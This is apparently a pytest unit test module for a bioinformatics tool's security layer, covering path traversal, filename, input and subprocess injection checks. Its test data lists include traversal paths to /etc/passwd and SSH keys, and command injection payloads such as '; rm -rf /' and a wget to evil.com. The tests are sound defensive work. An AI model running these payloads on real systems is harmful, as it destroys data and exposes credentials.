"""
Unit tests for security validation components.

This module tests PathValidator, InputValidator, SecureFileOperations,
and subprocess security with comprehensive coverage including:
- Parametrized tests for efficiency
- Property-based testing for edge cases
- Contract testing for interface compliance
- Performance benchmarking for security-critical paths
- Attack vector coverage with real-world examples

Test Organization:
- PathValidator: Filename/path validation, traversal prevention
- SecureFileOperations: Safe file I/O operations
- InputValidator: Input sanitization and validation
- SubprocessSecurity: Safe subprocess execution
- Integration: Cross-component security scenarios
"""

import os
import sys
import tempfile
from pathlib import Path
from typing import List
from unittest.mock import MagicMock, mock_open, patch

import pytest
from hypothesis import assume, given, settings
from hypothesis import strategies as st

# NOTE: Test utilities (assertions, factories) can be added later
# For now, focusing on core test functionality

from preprimer.core.exceptions import ParserError, SecurityError
from preprimer.core.security import (
    InputValidator,
    PathValidator,
    SecureFileOperations,
    secure_subprocess_call,
)


# =============================================================================
# Test Data - Organized by threat category
# =============================================================================

# Path Traversal Attacks
PATH_TRAVERSAL_ATTACKS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\SAM",
    "../../../../../../root/.ssh/id_rsa",
    "file/../../../etc/shadow",
    "normal/path/../../etc/passwd",
    "./../../../../../../etc/passwd",
    "....//....//....//etc/passwd",  # Double encoding
    "..\\..\\..\\..\\..\\..\\etc\\passwd",  # Windows style
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
]

# Dangerous Filenames
DANGEROUS_FILENAMES = [
    "file<script>",
    'file"dangerous',
    "file|command",
    "file?wildcard",
    "file*wildcard",
    "file\x00null",
    "",  # Empty
    "   ",  # Whitespace only
    "file.",  # Ends with period
    "file ",  # Ends with space
    "." * 300,  # Too long
]

# Windows Reserved Names
WINDOWS_RESERVED_NAMES = [
    "CON",
    "PRN",
    "AUX",
    "NUL",
    "COM1",
    "COM2",
    "COM3",
    "COM9",
    "LPT1",
    "LPT9",
    "con.txt",  # With extension
    "prn.csv",
    "aux.bed",
    "CON",  # Case variations
    "Con",
    "cOn",
]

# Safe Filenames (should pass validation)
SAFE_FILENAMES = [
    "normal_file.txt",
    "file-with-dashes.csv",
    "file123.tsv",
    "a.b.c.txt",
    "CamelCaseFile.bed",
    "file_with_underscores.fasta",
    "123numeric_start.txt",
    "unicode_文件名.txt",
    ".hidden_file",  # Hidden files are OK
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    "&& echo hacked",
    "|| echo hacked",
    "; wget http://evil.com/malware.sh",
    "$USER",
    "${PATH}",
]


# =============================================================================
# PathValidator Tests
# =============================================================================

@pytest.mark.unit
@pytest.mark.security
class TestPathValidatorPathTraversal:
    """Test path traversal attack prevention."""

    @pytest.mark.parametrize("malicious_path", PATH_TRAVERSAL_ATTACKS)
    def test_path_traversal_blocked(self, malicious_path):
        """Path traversal attempts should be blocked."""
        with pytest.raises(SecurityError, match="[Pp]ath traversal|invalid path"):
            PathValidator.sanitize_path(malicious_path)

    @pytest.mark.parametrize(
        "attack_path,expected_pattern",
        [
            ("../../../etc/passwd", "traversal"),
            ("/etc/passwd", "absolute.*outside"),
            ("C:\\Windows\\System32", "absolute.*outside"),
        ],
    )
    def test_path_traversal_error_messages(self, attack_path, expected_pattern):
        """Path traversal errors should have informative messages."""
        with pytest.raises(SecurityError, match=expected_pattern):
            PathValidator.sanitize_path(attack_path)

    def test_normalized_path_within_base(self, tmp_path):
        """Paths should be normalized and checked against base directory."""
        base_dir = tmp_path
        test_file = base_dir / "test.txt"
        test_file.touch()

        # This should work - file is within base_dir
        safe_path = PathValidator.sanitize_path(str(test_file))
        assert safe_path.resolve() == test_file.resolve()

    def test_symlink_traversal_prevention(self, tmp_path):
        """Symlinks should not allow escaping base directory."""
        # Create structure: base/link -> /etc/passwd
        base_dir = tmp_path
        link_path = base_dir / "dangerous_link"

        # Try to create symlink to system file
        try:
            link_path.symlink_to("/etc/passwd")
        except (OSError, PermissionError):
            pytest.skip("Cannot create symlinks on this system")

        # Should detect and block the symlink traversal
        with pytest.raises(SecurityError):
            PathValidator.sanitize_path(str(link_path))


@pytest.mark.unit
@pytest.mark.security
class TestPathValidatorFilenames:
    """Test filename validation."""

    @pytest.mark.parametrize("dangerous_name", DANGEROUS_FILENAMES)
    def test_dangerous_filenames_rejected(self, dangerous_name):
        """Dangerous filenames should be rejected."""
        with pytest.raises(SecurityError):
            PathValidator.validate_filename(dangerous_name)

    @pytest.mark.parametrize("reserved_name", WINDOWS_RESERVED_NAMES)
    def test_windows_reserved_names_rejected(self, reserved_name):
        """Windows reserved names should be rejected."""
        with pytest.raises(SecurityError, match="reserved name"):
            PathValidator.validate_filename(reserved_name)

    @pytest.mark.parametrize("safe_name", SAFE_FILENAMES)
    def test_safe_filenames_accepted(self, safe_name):
        """Safe filenames should be accepted."""
        # Should not raise
        PathValidator.validate_filename(safe_name)

    def test_filename_length_limit(self):
        """Filenames exceeding 255 bytes should be rejected."""
        # 256 characters (exceeds limit)
        long_name = "a" * 256

        with pytest.raises(SecurityError, match="too long"):
            PathValidator.validate_filename(long_name)

    def test_unicode_filename_length(self):
        """Unicode filenames should count UTF-8 bytes, not characters."""
        # Each Unicode character is 3 bytes in UTF-8
        unicode_name = "文" * 86  # 86 * 3 = 258 bytes > 255

        with pytest.raises(SecurityError, match="too long"):
            PathValidator.validate_filename(unicode_name)

    @pytest.mark.parametrize(
        "filename,reason",
        [
            ("", "empty"),
            ("   ", "whitespace"),
            ("...", "only.*periods"),
            ("file ", "end.*space"),
            ("file.", "end.*period"),
        ],
    )
    def test_filename_validation_reasons(self, filename, reason):
        """Filename validation should provide specific error reasons."""
        with pytest.raises(SecurityError, match=reason):
            PathValidator.validate_filename(filename)


@pytest.mark.unit
@pytest.mark.security
class TestPathValidatorProperties:
    """Property-based tests for PathValidator using Hypothesis."""

    @given(
        st.text(
            alphabet=st.characters(blacklist_categories=("Cs",)),  # Exclude surrogates
            min_size=1,
            max_size=50,
        )
    )
    @settings(max_examples=200, deadline=500)
    def test_valid_filename_no_forbidden_chars(self, filename):
        """Any string without forbidden chars and under length should work."""
        # Filter out strings that would fail for legitimate reasons
        assume(not filename.isspace())
        assume(not all(c == "." for c in filename))
        assume(not filename.endswith(" "))
        assume(not filename.endswith("."))
        assume(filename.upper() not in PathValidator.RESERVED_NAMES)
        assume(not any(char in PathValidator.FORBIDDEN_CHARS for char in filename))
        assume(len(filename.encode("utf-8")) <= 255)

        # Should not raise
        PathValidator.validate_filename(filename)

    @given(st.text(min_size=256, max_size=300))
    @settings(max_examples=50)
    def test_any_long_filename_rejected(self, filename):
        """Any filename over 255 bytes should be rejected."""
        assume(len(filename.encode("utf-8")) > 255)

        with pytest.raises(SecurityError):
            PathValidator.validate_filename(filename)

    @given(
        st.sampled_from(list(PathValidator.FORBIDDEN_CHARS)).flatmap(
            lambda char: st.text(min_size=1, max_size=20).map(lambda s: s + char)
        )
    )
    @settings(max_examples=100)
    def test_any_filename_with_forbidden_char_rejected(self, filename):
        """Any filename containing forbidden characters should be rejected."""
        with pytest.raises(SecurityError):
            PathValidator.validate_filename(filename)


# =============================================================================
# SecureFileOperations Tests
# =============================================================================

@pytest.mark.unit
@pytest.mark.security
class TestSecureFileOperations:
    """Test secure file operation utilities."""

    def test_safe_open_within_allowed_directory(self, tmp_path):
        """Files within allowed directory should be opened safely."""
        test_file = tmp_path / "test.txt"
        test_file.write_text("test content")

        # Should work
        with SecureFileOperations.safe_open(test_file, "r") as f:
            content = f.read()
            assert content == "test content"

    def test_safe_open_blocks_system_directories(self):
        """Opening files in system directories should be blocked."""
        system_paths = [
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        for sys_path in system_paths:
            if Path(sys_path).exists():
                with pytest.raises(SecurityError, match="system directory"):
                    SecureFileOperations.safe_open(sys_path, "r")

    def test_safe_write_creates_parent_directories(self, tmp_path):
        """Safe write should create parent directories if they don't exist."""
        nested_file = tmp_path / "nested" / "dir" / "file.txt"

        with SecureFileOperations.safe_open(nested_file, "w") as f:
            f.write("content")

        assert nested_file.exists()
        assert nested_file.read_text() == "content"

    def test_file_size_validation(self, tmp_path):
        """Large files should trigger size validation."""
        large_file = tmp_path / "large.txt"
        # Create a 200MB file (exceeds default 100MB limit)
        with open(large_file, "wb") as f:
            f.seek(200 * 1024 * 1024)
            f.write(b"\0")

        with pytest.raises(SecurityError, match="file size exceeds"):
            PathValidator.validate_file_size(large_file, max_size=100 * 1024 * 1024)

    @pytest.mark.parametrize("max_size", [1024, 10240, 1024 * 1024])
    def test_file_size_validation_thresholds(self, tmp_path, max_size):
        """File size validation should respect different thresholds."""
        test_file = tmp_path / "test.txt"
        # Create file just over the limit
        test_file.write_bytes(b"x" * (max_size + 1))

        with pytest.raises(SecurityError):
            PathValidator.validate_file_size(test_file, max_size=max_size)

        # Create file just under the limit
        small_file = tmp_path / "small.txt"
        small_file.write_bytes(b"x" * (max_size - 1))

        # Should not raise
        PathValidator.validate_file_size(small_file, max_size=max_size)


# =============================================================================
# InputValidator Tests
# =============================================================================

@pytest.mark.unit
@pytest.mark.security
class TestInputValidator:
    """Test input validation and sanitization."""

    @pytest.mark.parametrize("valid_sequence", ["ATCG", "ATCGATCGATCG", "NNNN", "RYSWKMBDHV"])
    def test_dna_sequence_validation_valid(self, valid_sequence):
        """Valid DNA sequences (including IUPAC) should pass."""
        assert InputValidator.validate_dna_sequence(valid_sequence)

    @pytest.mark.parametrize(
        "invalid_sequence", ["ATCGX", "123", "ATCG ", " ATCG", "AT CG", "PROTEIN"]
    )
    def test_dna_sequence_validation_invalid(self, invalid_sequence):
        """Invalid DNA sequences should be rejected."""
        with pytest.raises(SecurityError, match="Invalid DNA sequence"):
            InputValidator.validate_dna_sequence(invalid_sequence)

    def test_dna_sequence_case_insensitive(self):
        """DNA sequence validation should be case-insensitive."""
        assert InputValidator.validate_dna_sequence("atcg")
        assert InputValidator.validate_dna_sequence("AtCg")
        assert InputValidator.validate_dna_sequence("ATCG")

    def test_numeric_input_validation(self):
        """Numeric inputs should be validated for range and type."""
        # Valid inputs
        assert InputValidator.validate_integer("42") == 42
        assert InputValidator.validate_integer("0") == 0

        # Invalid inputs
        with pytest.raises(SecurityError, match="must be.*integer"):
            InputValidator.validate_integer("42.5")

        with pytest.raises(SecurityError):
            InputValidator.validate_integer("not_a_number")

    @pytest.mark.parametrize(
        "value,min_val,max_val,should_pass",
        [
            (50, 0, 100, True),
            (0, 0, 100, True),
            (100, 0, 100, True),
            (-1, 0, 100, False),
            (101, 0, 100, False),
        ],
    )
    def test_integer_range_validation(self, value, min_val, max_val, should_pass):
        """Integer range validation should enforce bounds."""
        if should_pass:
            result = InputValidator.validate_integer(str(value), min_val=min_val, max_val=max_val)
            assert result == value
        else:
            with pytest.raises(SecurityError):
                InputValidator.validate_integer(str(value), min_val=min_val, max_val=max_val)


# =============================================================================
# SubprocessSecurity Tests
# =============================================================================

@pytest.mark.unit
@pytest.mark.security
class TestSubprocessSecurity:
    """Test secure subprocess execution."""

    def test_command_as_list_required(self):
        """Commands should be passed as list, not string."""
        # String command should raise error (shell injection risk)
        with pytest.raises(SecurityError, match="must be a list"):
            secure_subprocess_call("ls -la")

    def test_shell_parameter_forbidden(self):
        """Shell parameter should not be allowed."""
        with pytest.raises(SecurityError, match="shell.*not allowed"):
            secure_subprocess_call(["ls", "-la"], shell=True)

    @pytest.mark.parametrize("injection_payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_prevention(self, injection_payload):
        """Command injection payloads should be detected."""
        # Try to inject malicious command
        command = ["echo", injection_payload]

        # Should detect dangerous patterns
        with pytest.raises(SecurityError, match="dangerous.*pattern"):
            secure_subprocess_call(command)

    def test_safe_command_execution(self):
        """Safe commands should execute successfully."""
        # This is a safe command (no injection risk)
        result = secure_subprocess_call(["echo", "safe_text"], capture_output=True)

        assert result.returncode == 0
        assert b"safe_text" in result.stdout

    def test_timeout_enforcement(self):
        """Long-running commands should timeout."""
        # Command that would run forever
        with pytest.raises(SecurityError, match="timeout"):
            secure_subprocess_call(["sleep", "100"], timeout=1)


# =============================================================================
# Integration Security Tests
# =============================================================================

@pytest.mark.integration
@pytest.mark.security
class TestSecurityIntegration:
    """Integration tests for cross-component security."""

    def test_parser_with_malicious_filename(self, tmp_path):
        """Parsers should reject files with malicious names."""
        from preprimer.parsers.varvamp_parser import VarVAMPParser

        # Try to create file with path traversal in name
        malicious_name = "../../../etc/passwd"

        with pytest.raises(SecurityError):
            parser = VarVAMPParser()
            parser.parse(malicious_name, prefix="test")

    def test_end_to_end_security_validation(self, tmp_path):
        """End-to-end test of security validation chain."""
        from preprimer.core.converter import PrimerConverter
        from preprimer.core.enhanced_config import EnhancedConfig

        # Create valid input file
        input_file = tmp_path / "valid_input.tsv"
        input_file.write_text("# Valid VarVAMP file\n")

        # Try to write to dangerous location
        dangerous_output = tmp_path / "../../../etc/output"

        config = EnhancedConfig()
        converter = PrimerConverter(config)

        with pytest.raises(SecurityError):
            converter.convert(
                input_file=input_file,
                output_dir=dangerous_output,
                input_format="varvamp",
                output_formats=["artic"],
            )

    def test_file_size_limit_integration(self, tmp_path):
        """File size limits should be enforced across the application."""
        # Create a large file (simulate attack)
        large_file = tmp_path / "huge_input.tsv"
        with open(large_file, "wb") as f:
            f.seek(200 * 1024 * 1024)  # 200MB
            f.write(b"\0")

        with pytest.raises(SecurityError, match="file size"):
            PathValidator.validate_file_size(large_file)


# =============================================================================
# Performance & Regression Tests
# =============================================================================

@pytest.mark.performance
@pytest.mark.security
class TestSecurityPerformance:
    """Performance tests for security-critical code paths."""

    def test_path_validation_performance(self, benchmark, tmp_path):
        """Path validation should be fast (<1ms per path)."""
        test_path = tmp_path / "test_file.txt"
        test_path.touch()

        result = benchmark(PathValidator.sanitize_path, str(test_path))
        assert result.exists()

    def test_filename_validation_performance(self, benchmark):
        """Filename validation should be very fast (<100µs)."""
        result = benchmark(PathValidator.validate_filename, "safe_filename.txt")
        assert result is None  # No exception = success

    @pytest.mark.parametrize("file_count", [10, 100, 1000])
    def test_batch_validation_performance(self, tmp_path, file_count):
        """Batch validation should scale linearly."""
        import time

        # Create test files
        files = []
        for i in range(file_count):
            f = tmp_path / f"file_{i}.txt"
            f.touch()
            files.append(f)

        # Measure validation time
        start = time.time()
        for f in files:
            PathValidator.sanitize_path(str(f))
        elapsed = time.time() - start

        # Should be fast: ~1ms per file max
        assert elapsed < file_count * 0.001, f"Validation too slow: {elapsed}s for {file_count} files"


# =============================================================================
# Contract Tests
# =============================================================================

@pytest.mark.unit
@pytest.mark.contract
class TestSecurityContracts:
    """Contract tests to ensure security components meet interface requirements."""

    def test_pathvalidator_contract(self):
        """PathValidator should have all required methods."""
        required_methods = [
            "validate_filename",
            "validate_path_components",
            "sanitize_path",
            "validate_file_size",
        ]

        for method in required_methods:
            assert hasattr(PathValidator, method), f"Missing required method: {method}"
            assert callable(getattr(PathValidator, method))

    def test_inputvalidator_contract(self):
        """InputValidator should have all required methods."""
        required_methods = [
            "validate_dna_sequence",
            "validate_integer",
            "sanitize_string",
        ]

        for method in required_methods:
            assert hasattr(InputValidator, method), f"Missing required method: {method}"
            assert callable(getattr(InputValidator, method))

    def test_security_error_messages(self):
        """Security errors should have informative messages."""
        try:
            PathValidator.sanitize_path("../../../etc/passwd")
        except SecurityError as e:
            # Error message should mention the issue
            message = str(e).lower()
            assert any(word in message for word in ["traversal", "invalid", "path", "security"])
            # Should not expose system details
            assert "passwd" not in message or "blocked" in message


# =============================================================================
# Regression Tests for Known Vulnerabilities
# =============================================================================

@pytest.mark.unit
@pytest.mark.security
class TestSecurityRegressions:
    """Regression tests for previously discovered security issues."""

    def test_cve_xxxx_double_encoding_traversal(self):
        """Regression test for double-encoded path traversal (hypothetical CVE)."""
        # Double-encoded path traversal attempt
        attack = "....//....//....//etc/passwd"

        with pytest.raises(SecurityError):
            PathValidator.sanitize_path(attack)

    def test_unicode_normalization_bypass(self):
        """Regression test for Unicode normalization bypass."""
        # Attempt to use Unicode lookalikes for path traversal
        unicode_attack = "\u2024\u2024/\u2024\u2024/etc/passwd"  # Using one-dot leaders

        with pytest.raises(SecurityError):
            PathValidator.sanitize_path(unicode_attack)

    def test_windows_alternate_data_streams(self):
        """Regression test for Windows alternate data streams."""
        # Windows ADS syntax
        ads_attack = "file.txt:hidden_stream"

        with pytest.raises(SecurityError, match="forbidden characters"):
            PathValidator.validate_filename(ads_attack)


# =============================================================================
# Test Fixtures
# =============================================================================

@pytest.fixture
def mock_system_path():
    """Mock system paths for testing without touching real filesystem."""
    with patch("pathlib.Path.exists") as mock_exists:
        mock_exists.return_value = False
        yield mock_exists


@pytest.fixture
def safe_temp_directory(tmp_path):
    """Provide a safe temporary directory for testing."""
    safe_dir = tmp_path / "safe_workspace"
    safe_dir.mkdir()
    return safe_dir
